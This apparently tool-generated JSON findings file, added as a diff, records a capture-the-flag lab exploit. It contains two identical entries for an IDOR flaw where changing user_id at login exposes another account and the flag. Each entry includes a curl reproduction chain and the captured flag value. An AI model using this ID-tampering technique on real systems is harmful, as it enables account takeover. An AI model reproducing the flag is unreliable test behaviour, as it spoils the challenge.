@@ -1,0 +1,41 @@
+{
+  "meta": {
+    "created": "2026-04-14T15:50:12.347673+00:00",
+    "target": ""
+  },
+  "findings": [
+    {
+      "id": "fbf39426-0dd1-4e38-878a-5fe33dd75df3",
+      "timestamp": "2026-04-14T15:50:12.347587+00:00",
+      "title": "IDOR - User ID Manipulation Exposes Flag",
+      "severity": "high",
+      "target": "http://172.17.0.1:52849",
+      "description": "The application uses user_id as a direct object reference in the session cookie. By manipulating the user_id parameter during login (changing from 10032 to 10001), an attacker can access another user's account and view sensitive information including the flag.",
+      "evidence": "flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665} - Found in the dashboard Welcome message when accessing user_id=10001",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -c /tmp/cookie.txt -X POST 'http://172.17.0.1:52849' -d 'username=test' -o /dev/null && curl -s -b /tmp/cookie.txt -X POST 'http://172.17.0.1:52849/password/test' -d 'user_id=10001&password=test' -o /dev/null && curl -s -b /tmp/cookie.txt 'http://172.17.0.1:52849/dashboard' | grep 'Welcome'",
+        "expected": "Welcome message contains flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}"
+      }
+    },
+    {
+      "id": "d9b1a7a5-e18a-43d3-9286-ad00a1d2a7ea",
+      "timestamp": "2026-04-14T15:50:12.438561+00:00",
+      "title": "IDOR - User ID Manipulation Exposes Flag",
+      "severity": "high",
+      "target": "http://172.17.0.1:52849",
+      "description": "The application uses user_id as a direct object reference in the session cookie. By manipulating the user_id parameter during login (changing from 10032 to 10001), an attacker can access another user's account and view sensitive information including the flag.",
+      "evidence": "flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665} - Found in the dashboard Welcome message when accessing user_id=10001",
+      "tool_used": "manual_http",
+      "cve": "",
+      "reproduction": {
+        "type": "http",
+        "command": "curl -s -c /tmp/cookie.txt -X POST 'http://172.17.0.1:52849' -d 'username=test' -o /dev/null && curl -s -b /tmp/cookie.txt -X POST 'http://172.17.0.1:52849/password/test' -d 'user_id=10001&password=test' -o /dev/null && curl -s -b /tmp/cookie.txt 'http://172.17.0.1:52849/dashboard' | grep 'Welcome'",
+        "expected": "Welcome message contains flag{c4dd1b56-5d9f-4779-80e2-065f3aaa8665}"
+      }
+    }
+  ],
+  "diagrams": []
+}
